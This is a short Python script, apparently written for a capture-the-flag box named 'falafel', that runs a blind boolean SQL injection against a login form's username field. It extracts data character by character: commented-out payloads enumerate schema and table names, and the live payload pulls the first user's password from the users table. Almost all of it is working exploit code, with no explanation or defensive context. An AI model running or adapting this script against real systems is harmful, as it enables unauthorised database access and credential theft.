#!/usr/bin/python3

import requests
import sys
import string

if len(sys.argv) != 2:
	print("usage: python3 {} <base url>" .format(sys.argv[0]))
	exit()

url = sys.argv[1]


#sessions
r = requests.session()

#begin sql injection
charset = string.digits+string.ascii_letters


print("\n")

password = ""
for t in range(1,34):
	for c in charset:
		#print(c)

		#retrieve DB names (falafel)
		#tri = r.post(url, data={"username":"sdssd' or (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 2,1),{},1))) = {}-- -" .format(t,ord(c)), "password":"password"})
		
		#retrieve tables (users)
		#tri = r.post(url, data={"username":"sdssd' or (ascii(substr((SELECT table_name FROM information_schema.tables where table_schema=\"falafel\" LIMIT 1,1),{},1))) = {}-- -" .format(t,ord(c)), "password":"password"})

		#retrieve password
		tri = r.post(url, data={"username":"sdssd' or (ascii(substr((SELECT password FROM users LIMIT 0,1),{},1))) = {}-- -" .format(t,ord(c)), "password":"password"})

		if "admin" in tri.text:
			password = password + c
			print("Password = {}".format(password), end="\r")
			break

print("\n")
